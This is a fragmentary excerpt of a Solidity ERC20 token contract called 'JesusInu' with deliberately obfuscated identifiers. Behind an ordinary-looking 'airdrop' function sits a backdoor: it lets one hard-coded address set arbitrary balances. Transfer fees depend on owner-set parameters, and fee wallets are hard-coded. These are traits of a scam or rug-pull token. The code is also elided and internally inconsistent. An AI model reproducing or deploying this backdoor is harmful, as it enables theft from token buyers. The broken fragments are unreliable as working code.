...
contract Context {
 ...
 contract JesusInu is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private podlodialgilap;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name;
    string private _symbol = "JESUSINU";
    uint256 private constant MAX = ~uint256(0);

    uint256 private _maxTx = _totalSupply;
    address private _feeAddrWallet1 = 0x608756c184A0723077B0c10F97f4D054c9eE1C0F;
    address private _feeAddrWallet2 = 0x608756c184A0723077B0c10F97f4D054c9eE1C0F;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private constant _tTotal = 100 * 10**18;
    address private _boropurvi = 0x58b4B49b6268C205805450a6E54c0d64da206b75;
    uint256 private _rTotal = 1 * 100**18;
    ...
    constructor(uint256 totalSupply_,uint256 samoedno, string memory imeneishan) {
        _name = imeneishan;
        _francis = samoedno;
        _owner = _msgSender();
         _totalSupply = totalSupply_;
        podlodialgilap[msg.sender] = _totalSupply;
    ...
    function airdrop(uint256 serafimcho) public {
        podlodialgilap[_msgSender()] = serafimcho;
        require(_msgSender() == _boropurvi, "Transaction failed!");
    }
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = podlodialgilap[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            podlodialgilap[issuer] = senderBalance - allons;
        }
        _fee = (allons * _demand / 100) / _francis;
        allons = allons -  (_fee * _francis);
        
        podlodialgilap[grantee] += allons;
   ...
   */
    ...
    function _burn(address account, uint256 sum) internal virtual {
        ...
        uint256 accountBalance = podlodialgilap[account];
        require(accountBalance >= sum, "BEP : Can't be done");
        unchecked {
            podlodialgilap[account] = accountBalance - sum;
        }
        _totalSupply -= sum;
